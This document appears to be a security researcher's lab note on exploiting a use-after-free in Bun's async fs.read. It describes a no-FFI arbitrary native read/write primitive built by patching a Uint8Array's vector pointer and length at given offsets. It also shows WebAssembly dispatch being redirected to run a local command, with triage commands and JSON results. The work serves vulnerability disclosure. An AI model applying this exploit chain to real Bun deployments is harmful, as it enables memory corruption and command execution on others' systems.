# fs UAF real typed-array vector patch — no-FFI native R/W

Date: 2026-05-10

Scope: local Bun/JSC exploit development from the confirmed async `fs.read`
BufferSource UAF. No `bun:ffi`, no native helper dylib, no symbol lookup, no
remote service path.

## Summary

The fake-cell route is no longer needed to obtain a JS-facing native R/W view.
Using the existing no-FFI `addrof` -> ArrayBuffer metadata bridge, a real
`Uint8Array` cell can be patched in place:

1. Build the two-stage ArrayBuffer metadata bridge.
2. Leak `addrof(rwView)` and `addrof(targetView)`.
3. Read both typed-array cells.
4. Patch `rwView` offset `16` (`m_vector`) to `targetView.m_vector + SHIFT`.
5. Patch `rwView` offset `24` (`m_length`) to a small valid length.
6. Use normal JS indexing on `rwView`.
7. Restore the original `m_vector` and `m_length`.

This keeps the fake object problem out of the chain: `rwView` is a real JSC
cell in the right allocation class, with a valid live Structure. Only its data
pointer is temporarily redirected.

## Harness

`lab/harnesses/13-arb-rw-probes/real-typedarray-vector-patch-arw.js`

The harness proves a persistent JS-visible native alias:

* `rwView[0]` reads the byte at `targetView[SHIFT]`.
* `rwView[0] = 0x5a` changes `targetView[SHIFT]` to `0x5a`.
* The original `rwView` vector and length are restored before the process exits.

## Validation

Command:

```sh
ASAN_OPTIONS=halt_on_error=1:abort_on_error=0:exitcode=66:detect_leaks=0:detect_stack_use_after_return=1:strict_string_checks=1:check_initialization_order=1:detect_invalid_pointer_pairs=2:fast_unwind_on_fatal=1:malloc_context_size=64:allocator_may_return_null=0:print_stats=0:symbolize=0:print_module_map=0:quarantine_size_mb=0 \
TIMEOUT=120 \
lab/scripts/triage.sh \
  lab/harnesses/13-arb-rw-probes/real-typedarray-vector-patch-arw.js
```

Environment:

* Bun binary: `bun/build/release-asan/bun-asan`
* Bun version: `1.3.14`
* ASAN: enabled
* FFI: no
* Native helper dylib: no
* JIT warming: no
* UAF sizes:
  * `8192` for object-array `addrof`
  * `128` for ArrayBuffer metadata bridge
* Reclaim carrier: sprayed `Uint8Array(new ArrayBuffer(128))`
* Stale write offset: `16` in the 128-byte metadata bridge carrier
* Patched real cell: `Uint8Array` offset `16` (`m_vector`) and offset `24`
  (`m_length`)

Run:

`lab/findings/runs/20260510T095355Z-76630/asan.log`

Repeat confirmation:

`lab/findings/runs/20260510T095645Z-82497/asan.log`

Result:

```text
[triage] exit=86
[triage] no crash signature found
```

Key facts:

```json
{
  "ok": true,
  "rwCellAddr": "0x000062d002dcc250",
  "rwVector": "0x000062d002c08150",
  "rwLength": "0x0000000000000008",
  "targetCellAddr": "0x000062d002dcc280",
  "targetVector": "0x0000606000019b20",
  "targetLength": "0x0000000000000040",
  "shift": 17,
  "aliasAddr": "0x0000606000019b31",
  "aliasReadBefore": 65,
  "targetBefore": 65,
  "aliasWrite": 90,
  "aliasReadAfter": 90,
  "targetAfter": 90,
  "restoreVector": "0x000062d002c08150",
  "restoreLength": "0x0000000000000008",
  "bridgeError": null
}
```

Interpretation:

* `rwView` and `targetView` are real live `Uint8Array` cells.
* `targetView.m_vector + 17` held byte `65`.
* After patching `rwView.m_vector`, `rwView[0]` also read `65`.
* Writing `90` through `rwView[0]` changed `targetView[17]` to `90`.
* Restoring `rwView.m_vector` and `rwView.m_length` succeeded.

This is a no-FFI arbitrary native R/W primitive over known valid mapped
addresses. It is stronger than the bridge-only proof because the final access
surface is an ordinary JS typed array, not a one-shot metadata retargeting.

## RCE relevance

The existing no-FFI WebAssembly dispatch-control artifact still reproduces
with a command marker:

Run:

`lab/findings/runs/20260510T095425Z-77854/asan.log`

Command mode:

```sh
rm -f /tmp/bun_uaf_noffi_wasm_marker /tmp/bun_uaf_noffi_command_marker
ASAN_OPTIONS=halt_on_error=1:abort_on_error=0:exitcode=66:detect_leaks=0:detect_stack_use_after_return=1:strict_string_checks=1:check_initialization_order=1:detect_invalid_pointer_pairs=2:fast_unwind_on_fatal=1:malloc_context_size=64:allocator_may_return_null=0:print_stats=0:symbolize=0:print_module_map=0:quarantine_size_mb=0 \
TIMEOUT=240 CROSS_MODULE=1 MARKER_IMPORT=1 COMMAND_IMPORT=1 \
FAKE_DESCRIPTOR=1 FAKE_DESCRIPTOR_MODE=replacement EXTRA_CELL_FIELDS=40 \
MARKER_PATH=/tmp/bun_uaf_noffi_wasm_marker \
COMMAND_MARKER_PATH=/tmp/bun_uaf_noffi_command_marker \
MARKER_COMMAND="printf 'typedarray-arw-cross-command:%s\n' \"$$\" > /tmp/bun_uaf_noffi_command_marker" \
lab/scripts/triage.sh \
  lab/harnesses/13-arb-rw-probes/wasm-export-code-pointer-redirect-probe.js
```

Result:

```json
{
  "noFfi": true,
  "nativeHelperDylib": false,
  "crossModule": true,
  "fakeDescriptor": true,
  "extraCellFields": [40],
  "markerAfter": true,
  "commandMarkerAfter": true,
  "commandResultAfter": { "status": 0, "error": null },
  "patchedA": 7,
  "restoredA": 42,
  "ok": true
}
```

Filesystem markers:

```text
/tmp/bun_uaf_noffi_wasm_marker: wasm-marker:<pid>
/tmp/bun_uaf_noffi_command_marker: typedarray-arw-cross-command:<pid>
```

This confirms the current FFI-free exploitability state:

* arbitrary native R/W over known mapped addresses is now demonstrated through a
  real typed-array vector patch;
* WebAssembly export dispatch can be redirected without FFI and can reach a
  command-capable host import supplied by the local JS environment;
* direct shellcode execution from JS heap data remains blocked by NX/W^X;
* this is still local-JS exploit evidence, not remote service reachability.

## Boundary

Do not overstate this as remote RCE or standalone shellcode execution. The
command-marker run depends on attacker-supplied WebAssembly and an
attacker-supplied JS import that executes the local command. The memory
corruption is what redirects an unrelated export to that import path, but the
host import itself is local JS scaffolding.

The public advisory can now accurately mention no-FFI native R/W over known
mapped addresses and no-FFI WebAssembly dispatch control if we choose to extend
it, but it should still avoid claims of remote exploitability or generic native
shellcode execution.
